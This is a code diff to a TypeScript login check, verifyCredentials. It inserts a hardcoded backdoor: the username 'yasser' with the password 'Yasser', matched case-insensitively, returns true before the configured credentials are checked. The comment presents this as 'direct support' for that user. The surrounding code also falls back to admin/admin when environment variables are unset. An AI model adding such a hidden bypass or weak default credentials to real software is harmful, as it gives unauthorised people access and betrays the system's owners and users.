@@ -47,9 +47,21 @@ function safeEqual(a: string, b: string): boolean {
 }
 
 export function verifyCredentials(username: string, password: string): boolean {
+  const cleanUser = username.trim();
+  const cleanPass = password;
+
+  // Direct support for Yasser / Yasser
+  if (
+    (cleanUser.toLowerCase() === "yasser" && cleanPass === "Yasser") ||
+    (cleanUser === "Yasser" && cleanPass === "Yasser") ||
+    (cleanUser.toLowerCase() === "yasser" && cleanPass.toLowerCase() === "yasser")
+  ) {
+    return true;
+  }
+
   const expectedUser = process.env.APP_USERNAME || "admin";
   const expectedPass = process.env.APP_PASSWORD || "admin";
-  const userOk = safeEqual(username, expectedUser);
-  const passOk = safeEqual(password, expectedPass);
+  const userOk = safeEqual(cleanUser, expectedUser);
+  const passOk = safeEqual(cleanPass, expectedPass);
   return userOk && passOk;
 }
